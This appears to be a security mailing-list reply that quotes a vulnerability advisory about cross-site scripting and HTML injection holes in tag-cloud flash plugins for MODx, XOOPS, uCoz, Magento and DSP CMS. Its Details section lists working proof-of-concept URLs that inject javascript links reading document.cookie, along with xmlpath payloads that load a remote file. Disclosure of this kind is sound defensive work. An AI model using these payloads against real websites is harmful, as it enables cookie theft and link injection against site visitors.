Hello Antony!

You are welcome.

All those XSS vulnerabilities in 34 millions flash files, and all those 
vulnerable plugins for different engines with vulnerable swf-file, which 
I've wrote about during 2010-2011, including last five plugins, and those 
vulnerabilities in TinyMCE (on tens millions of web sites, only on WordPress 
there are more then 67 millions of affected web sites), and all those 
vulnerabilities disclosed by me in 2011, and that new version of plugin 
Register Plus Redux (with fixed all holes), which I wrote about in the last 
advisory - all these are my presents. So Merry Christmas and Happy New Year!

Of course I wish good music for everyone for holidays. Like this one:

Hello list!

Besides tens millions of vulnerable web sites with affected flash files and
vulnerable multiple plugins for different engines, which I've wrote about
earlier, there are a lot of other vulnerable plugins. Here are new ones
(some of them are vulnerable to two XSS holes). There are Cross-Site
Scripting vulnerabilities in plugins for engines MODx CMS, XOOPS, uCoz,
Magento and DSP CMS, which all are ports of WP-Cumulus. A lot of other such
plugins for other engines can be vulnerable.

This XSS is similar to XSS vulnerability in WP-Cumulus, which I've disclosed
in 2009 (http://securityvulns.com/Wdocument842.html). Because these plugins
are using tagcloud.swf made by author of WP-Cumulus. About such
vulnerabilities I wrote in 2009-2011, particularly about millions of flash
files tagcloud.swf which are vulnerable to XSS attacks I mentioned in my
article XSS vulnerabilities in 34 millions flash files
(http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2010-January/006033.html).

-------------------------
Affected products:
-------------------------

Vulnerable are all versions of Tagcloud for MODx CMS.

Vulnerable is 小umulus for XOOPS 1.0, which is also included in
ExtendedPackRU for XOOPS.

Vulnerable are all versions of uCoz-Cumulus for uCoz.

Vulnerable are all versions of Cumulus Tagcloud for Magento.

Vulnerable are all versions of 小umulus for DSP CMS.

Some of these plugins are vulnerable to one and some to two XSS holes - as
to first hole in WP-Cumulus, which I've disclosed in 2009, as to second
hole, which I've disclosed in 2011.

Besides these ones and those which I've disclosed in 2009-2011, a lot of
other such plugins for other engines can be vulnerable.

Details:
----------

XSS (WASC-08):

Tagcloud for MODx CMS:

http://site/assets/files/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

小umulus for XOOPS:

http://site/modules/cumulus/include/cumulus.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

uCoz-Cumulus for uCoz:

http://site/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E

Cumulus Tagcloud for Magento:

http://site/frontend/tag/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href=%27javascript:alert(document.cookie)%27+style=%27font-size:+40pt%27%3EClick%20me%3C/a%3E%3C/tags%3E

http://site/frontend/tag/tagcloud.swf?xmlpath=xss.xml

http://site/frontend/tag/tagcloud.swf?xmlpath=http://site/xss.xml

Via parameters mode and xmlpath.

小umulus for DSP CMS:

http://site/engine/tags/cumulus.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href=%27javascript:alert(document.cookie)%27+style=%27font-size:+40pt%27%3EClick%20me%3C/a%3E%3C/tags%3E

Code will execute after click. It's strictly social XSS
(http://websecurity.com.ua/5476/). Also it's possible to conduct (like in
WP-Cumulus) HTML Injection attack.

-------------------------------------------------
Plugins with fixed version of swf-file:
-------------------------------------------------

Because in November 2009, after my informing, Roy Tanck (developer of
WP-Cumulus) fixed only XSS vector, but not HTML Injection vector, it's still
possible to conduct HTML Injection attacks (for injecting arbitrary links)
to all versions of this swf-file (which can be found under name tagcloud.swf
and other names). Including fixed version of the swf-file, with fixed XSS
hole.

So all those plugins, which developers fixed this vulnerability (after my
informing or by informing from Roy or other people) by updating swf-file,
are still vulnerable to HTML Injection. These five plugins are using
non-fixed version of swf-file.

I mentioned about these vulnerabilities at my site:
http://websecurity.com.ua/5601/
